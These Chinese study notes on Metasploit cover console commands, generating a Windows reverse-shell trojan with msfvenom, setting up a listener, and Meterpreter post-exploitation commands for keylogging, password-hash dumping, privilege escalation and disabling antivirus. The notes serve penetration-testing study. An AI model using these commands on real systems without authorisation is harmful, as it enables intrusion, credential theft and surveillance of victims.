# 启动Metasploit

- **启动MSF只要在kali中输入msfconsole就可以启动了**
- **启动PostgreSql数据库服务**:`service postgresql start` 
- **初始化MSF数据库**：`msfdb init`
- **查看数据库链接情况：**`msfconsole db_status`
- **建立数据库缓存：**`msfconsole db_rebuild_cache`

---

# 专业术语

1. **Exploit:攻击工具/代码**
2. **Payload:攻击载荷**
3. **Shellcode:可以理解为攻击代码**
4. **Module:模块**
5. **Listener:监听器**

---

# MSF中常用的命令

- show exploits-查看所有可用的渗透攻击程序
- show auxiliary -查看所有可用的辅助攻击工具
- show options - 查看一个模块所有可用选项
- show payloads - 查看一个模块适用的所有攻击载荷
- show targets - 查看一个模块可以攻击的目标类型
- search - 根据关键搜索某个模块
- info - 显示某个模块的详细信息
- use - 使用某个攻击模块
- back - 返回
- set/unset - 设置/禁用模块中的某个参数
- setg/unsetg - 设置/禁用适用于所有模块的全局参数
- save - 将当前设置值保存下来 下次启动msf依然可以使用

---

# <font color=red>MsfVenom（木马制作器）</font>

- **主要参数:**

```javascript
-p payload
-e 编码方式
-i 编码次数
-b 在生成的程序中避免出现的值
LHOST，LPORT 监听上线的主机ip和端口
-f 指定生成的格式 如exe
msfvenom -l payloads 查看所有可以利用的payload
可以使用grep查询特定payload

```

- **示例**

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=自己的IP地址 LPORT=要监听的端口 -f exe > 文件名.exe
```

- **在MSF中启动监听**

  ```shell
  set payload payloadName #要和被生成的程序使用一样的Payload
  set LHOST 自己的IP
  set LPORT 设置的监听端口
  set ExitOnSession false #让傀儡机器保持连接 就算一个连接退出 后台也保持监听状态
  exploit #执行监听 -j参数：作为job开始运行 -z:不立即进行session交换-也就是后台运行
  
  ```

  - **实例**

    ```shell
    use exploit/multi/handler
    set payload xxx
    show options#根据内容进行设置
    ```

    - **建立连接之后**

      ```shell
      sessions -i x 切换到某个会话
      sessions -k x 结束某个会话
      sessions -l 查看所有会话
```
      
  
  ---

# <font color=blue>Meterpreter渗透后攻击</font>

- > **Meterpreter提供的功能包括:反追踪，纯内存工作模式，系统信息获取 密码hash导出，文件上传下载，屏幕截图 键盘记录 权限提升 跳板攻击等**

- **常用的一些命令:**

  ```shell
  background:放回后台
  exit:关闭会话
  help：查看帮助
  sysinfo：系统信息
  screenshot：截图，可以使用eog查看图片
  shell：进入系统命令行
  getlwd：查看本地目录
  lcd:切换本地目录
  getwd：查看目录
  ls：查看文件
  cd：切换目录
  rm:删除文件
  download:download 远程路径 本地路径 下载文件
  upload:上传本地文件到远程主机，和上面命令相反
  execute -f xxx.exe -i :执行程序/命令
  ps:查看进程
  run post/windows/capture/keylog_recorder 键盘记录
  getuid：查看当前用户权限
  use priv：加载特权模块
  getsystem:提升到system权限
  hashdump：导出密码hash
  steal_token <PID>:伪装用户，用于执行一些gui界面特别有用
  rev2self:恢复默认令牌
  migrate_pid:迁移进程
  run killav:关闭杀毒软件
  run getgui -e：启动远程桌面
  
  ```

  